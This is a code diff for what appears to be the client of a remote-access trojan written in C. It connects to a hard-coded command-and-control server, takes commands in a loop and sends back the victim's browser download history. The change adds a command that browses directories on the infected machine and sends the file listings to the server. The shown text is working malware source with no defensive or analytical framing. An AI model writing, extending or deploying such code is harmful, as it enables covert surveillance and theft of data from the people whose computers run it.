@@ -16,6 +16,8 @@
 #define SERVER_IP "192.168.100.100"
 
 int main() {
+    // Client doesn't really have any way to quit for now
+connect:
     SOCK_INIT();
 
     // Create a TCP socket descriptor.
@@ -27,7 +29,6 @@ int main() {
     serv.sin_port = htons(C2_PORT);
     inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);
 
-connect:
     // Attempt to connect to c2server
     while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
         printf("[DEBUG] Attempting to connect to server\n");
@@ -47,6 +48,7 @@ connect:
         char* payload = (char*)safe_recv(sock, &cmd, NULL, 0);
         if (payload == NULL) {
             CLOSE_SOCK(sock);
+            SHUT_DOWN();
             goto connect; // Stupid 
         }
 
@@ -80,7 +82,11 @@ connect:
             char* dl = get_browser_downloads();
             safe_send(sock, dl, BROWSER_DL_CMD, strlen(dl) + 1, 0);
             free(dl);
-        } 
+        } else if (cmd == BROWSE_FILE_CMD) {
+            char* files = browse_dir(payload);
+            safe_send(sock, files, BROWSE_FILE_CMD, strlen(files) + 1, 0);
+            free(files);
+        }
         free(payload);
     }
 
